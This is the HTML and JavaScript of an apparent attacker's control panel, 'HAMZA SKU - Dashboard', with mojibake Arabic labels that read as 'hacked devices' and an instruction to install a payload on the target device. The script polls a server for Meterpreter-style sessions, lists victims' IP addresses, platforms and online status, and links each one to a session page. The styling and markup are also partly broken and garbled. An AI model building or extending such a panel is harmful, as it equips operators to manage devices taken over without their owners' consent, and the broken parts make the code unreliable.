<!DOCTYPE html>

        h1 {

        }
        
        .header-actions {

        .btn {

        .stat-icon {

        .stat-number {

            font-weight: bold;

        }
        
        .stat-label {

        .card {

            border: 2px solid rgba(0, 255, 136, 0.3);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 20px;
        }
        
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .card-title {
            color: #00ff88;
            font-size: 24px;
        }
        
        .last-update {
            color: #8b95a8;
            font-size: 12px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        th, td {
            padding: 18px;
            text-align: right;
            border-bottom: 1px solid rgba(0, 255, 136, 0.1);
        }
        
        th {
            background: rgba(0, 255, 136, 0.1);
            color: #00ff88;
            font-weight: bold;
            font-size: 14px;
            text-transform: uppercase;
        }
        
        tbody tr {
            transition: all 0.3s;
        }
        
        tbody tr:hover {
            background: rgba(0, 255, 136, 0.08);
            cursor: pointer;
            transform: scale(1.01);
        }
        
        .session-id {
            color: #00ff88;
            font-weight: bold;
            font-family: 'Courier New', monospace;
        }
        
        .session-ip {
            color: #0088ff;
            font-family: 'Courier New', monospace;
        }
        
        .platform-badge {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        
        .platform-android {
            background: linear-gradient(135deg, #3ddc84, #2db669);
            color: #000;
        }
        
        .platform-windows {
            background: linear-gradient(135deg, #0078d4, #005a9e);
            color: #fff;
        }
        
        .platform-linux {

            color: #000;
        }
        
        .status-badge {
            display: inline-block;

        }
        
        .status-online {

            border: 1px solid #00ff88;
        }
        
        .status-offline {
            background: rgba(255, 0, 85, 0.2);
            color: #ff0055;
            border: 1px solid #ff0055;
        }
        
        .empty {

            color: #8b95a8;
        }
        
        .empty-icon {
            font-size: 64px;
            margin-bottom: 20px;
            opacity: 0.5;
        }
        
        .loading {
            text-align: center;
            padding: 40px;
            color: #00ff88;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .spinner {
            display: inline-block;
            animation: spin 1s linear infinite;
            font-size: 24px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>ğŸ”¥ HAMZA SKU - Dashboard</h1>
            <div class="header-actions">
                <button class="btn btn-reload" onclick="reloadSessions()">ğŸ”„ ØªØ­Ø¯ÙŠØ«</button>
                <a href="/" class="btn btn-back">âš™ï¸ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª</a>

        <div class="stats">
            <div class="stat-card">
                <div class="stat-icon">ğŸ¯</div>

                <div class="stat-label">Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©</div>

            <div class="stat-card">

                <div class="stat-label">Ù…ØªØµÙ„ Ø§Ù„Ø¢Ù†</div>

            <div class="stat-card">

            <div class="stat-card">

                <div class="stat-label">Ø£Ø®Ø±Ù‰</div>

        </div>
        
        <div class="card">
            <div class="card-header">
                <h2 class="card-title">ğŸ¯ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„Ù…Ø®ØªØ±Ù‚Ø©</h2>
                <div class="last-update" id="last-update">Ø¢Ø®Ø± ØªØ­Ø¯ÙŠØ«: --:--:--</div>
            </div>
            
            <div id="table-container">
                <div class="loading">

            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let knownSessions = new Set();
        
        socket.on('connect', () => {
            console.log('âœ“ Connected to server');
            loadSessions();
        });
        
        socket.on('new_session', (session) => {
            console.log('âœ“ New session:', session);
            if (!knownSessions.has(session.id)) {
                loadSessions();
            }
        });
        
        socket.on('sessions_update', (data) => {
            console.log('âœ“ Sessions update');
            updateSessions(data.sessions);
        });
        
        async function loadSessions() {
            try {
                const res = await fetch('/api/sessions');
                const data = await res.json();
                updateSessions(data.sessions);
            } catch (e) {
                console.error('âŒ Failed to load sessions:', e);
            }
        }
        
        async function reloadSessions() {
            const btn = event.target;
            btn.disabled = true;
            btn.textContent = 'â³ Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ø¯ÙŠØ«...';
            
            await loadSessions();
            
            setTimeout(() => {
                btn.disabled = false;
                btn.textContent = 'ğŸ”„ ØªØ­Ø¯ÙŠØ«';
            }, 1000);
        }
        
        function updateSessions(sessions) {
            // Update timestamp
            const now = new Date();
            document.getElementById('last-update').textContent = 
                `Ø¢Ø®Ø± ØªØ­Ø¯ÙŠØ«: ${now.toLocaleTimeString('ar-SA')}`;
            
            // Remove duplicates - keep only unique sessions by ID
            const uniqueSessions = [];
            const seenIds = new Set();
            
            sessions.forEach(s => {
                if (!seenIds.has(s.id)) {
                    seenIds.add(s.id);
                    uniqueSessions.push(s);
                }
            });
            
            knownSessions = seenIds;
            
            // Update stats
            document.getElementById('total-sessions').textContent = uniqueSessions.length;
            
            const online = uniqueSessions.filter(s => s.status === 'online').length;
            document.getElementById('online-sessions').textContent = online;
            
            const android = uniqueSessions.filter(s => 
                s.platform && s.platform.toLowerCase().includes('android')).length;
            document.getElementById('android-count').textContent = android;
            document.getElementById('other-count').textContent = uniqueSessions.length - android;
            
            const container = document.getElementById('table-container');
            
            if (uniqueSessions.length === 0) {
                container.innerHTML = `
                    <div class="empty">
                        <div class="empty-icon">ğŸ“­</div>
                        <div>Ù„Ø§ ØªÙˆØ¬Ø¯ Ø£Ø¬Ù‡Ø²Ø© Ù…ØªØµÙ„Ø© Ø­Ø§Ù„ÙŠØ§Ù‹</div>
                        <div style="margin-top: 10px; font-size: 12px;">Ù‚Ù… Ø¨ØªØ´ØºÙŠÙ„ Handler ÙˆØªØ«Ø¨ÙŠØª Payload Ø¹Ù„Ù‰ Ø§Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„Ù…Ø³ØªÙ‡Ø¯Ù</div>
                    </div>
                `;
                return;
            }
            
            container.innerHTML = `
                <table>
                    <thead>
                        <tr>
                            <th>Ø§Ù„Ø­Ø§Ù„Ø©</th>
                            <th>Ø§Ù„Ù†ÙˆØ¹</th>
                            <th>Ø§Ù„Ù…Ù†ØµØ©</th>
                            <th>Ø¹Ù†ÙˆØ§Ù† IP</th>
                            <th>Ù…Ø¹Ø±Ù Ø§Ù„Ø¬Ù„Ø³Ø©</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${uniqueSessions.map(s => {
                            const platformClass = s.platform ? 
                                `platform-${s.platform.toLowerCase().split('/')[0]}` : 
                                'platform-linux';
                            
                            return `
                                <tr onclick="openSession('${s.id}')">
                                    <td>
                                        <span class="status-badge status-${s.status}">
                                            ${s.status === 'online' ? 'ğŸŸ¢ Ù…ØªØµÙ„' : 'ğŸ”´ ØºÙŠØ± Ù…ØªØµÙ„'}
                                        </span>
                                    </td>
                                    <td>${s.type || 'meterpreter'}</td>
                                    <td>
                                        <span class="platform-badge ${platformClass}">
                                            ${s.platform || 'Unknown'}
                                        </span>
                                    </td>
                                    <td><span class="session-ip">${s.ip}</span></td>
                                    <td><span class="session-id">#${s.id}</span></td>
                                </tr>
                            `;
                        }).join('')}
                    </tbody>
                </table>
            `;
        }
        
        function openSession(id) {
            window.location.href = `/session/${id}`;
        }
        
        // Initial load
        loadSessions();
        
        // Auto refresh every 10 seconds
        setInterval(loadSessions, 10000);
    </script>
</body>
